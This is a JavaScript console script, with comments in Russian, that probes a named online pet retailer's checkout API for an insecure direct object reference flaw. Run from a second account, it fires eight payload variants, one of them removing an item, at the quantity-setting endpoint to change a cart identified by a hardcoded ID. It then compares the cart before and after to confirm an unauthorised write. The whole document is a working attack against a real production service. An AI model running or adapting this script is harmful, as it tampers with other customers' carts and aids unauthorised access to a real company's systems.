// Тест с разными вариантами payload и headers
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

console.log("[*] Testing set-article-quantity with different payload formats...");

fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  const articleId = cart.articles[0]?.id;
  const offerId = cart.articles[0]?.offerId;
  console.log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  console.log(`[+] Article ID: ${articleId}, Offer ID: ${offerId}`);
  
  // Попробуем разные варианты payload
  const tests = [
    // Вариант 1: Только articleId и quantity (без cartUuid)
    {
      name: "Only articleId + quantity",
      payload: { articleId: articleId, quantity: 2 }
    },
    // Вариант 2: С offerId вместо articleId
    {
      name: "offerId + quantity",
      payload: { offerId: offerId, quantity: 2 }
    },
    // Вариант 3: С id вместо articleId
    {
      name: "id + quantity",
      payload: { id: articleId, quantity: 2 }
    },
    // Вариант 4: С articleId как строка
    {
      name: "articleId as string",
      payload: { articleId: String(articleId), quantity: 2 }
    },
    // Вариант 5: С quantity как строка
    {
      name: "quantity as string",
      payload: { articleId: articleId, quantity: "2" }
    },
    // Вариант 6: С дополнительными полями
    {
      name: "With extra fields",
      payload: { 
        articleId: articleId, 
        quantity: 2,
        cartUuid: CART_UUID,
        siteId: 1
      }
    },
    // Вариант 7: Формат как в state-api
    {
      name: "State API format",
      payload: {
        article: { id: articleId },
        quantity: 2
      }
    },
    // Вариант 8: Удаление товара
    {
      name: "Remove article (quantity 0)",
      payload: { articleId: articleId, quantity: 0 }
    }
  ];
  
  return Promise.allSettled(
    tests.map((test, i) => {
      console.log(`\n[*] Test ${i+1}: ${test.name}`);
      console.log(`    Payload:`, JSON.stringify(test.payload));
      
      return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "X-Requested-With": "XMLHttpRequest"
        },
        body: JSON.stringify(test.payload)
      })
      .then(async r => {
        const status = r.status;
        const contentType = r.headers.get("content-type") || "";
        const text = await r.text();
        
        console.log(`    Status: ${status}`);
        console.log(`    Content-Type: ${contentType}`);
        
        if (contentType.includes("application/json")) {
          try {
            const json = JSON.parse(text);
            console.log(`    Response (JSON):`, JSON.stringify(json).substring(0, 200));
            return { success: status < 400, test: i+1, name: test.name, status, response: json };
          } catch (e) {
            console.log(`    Response (text): ${text.substring(0, 200)}`);
            return { success: false, test: i+1, name: test.name, status, response: text };
          }
        } else {
          console.log(`    Response (HTML): ${text.substring(0, 200)}`);
          return { success: false, test: i+1, name: test.name, status, response: text, isHtml: true };
        }
      })
      .catch(e => {
        console.log(`    Error: ${e.message}`);
        return { success: false, test: i+1, name: test.name, error: e.message };
      });
    })
  );
})
.then(results => {
  console.log("\n[*] All tests completed. Checking cart state...");
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`\n[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
  } else {
    console.log("\n[!] Cart unchanged - need exact payload from Network tab");
    console.log("[!] Please check Network tab for the exact request when you change quantity in YOUR cart");
  }
})
.catch(e => console.error("[!] Error:", e));

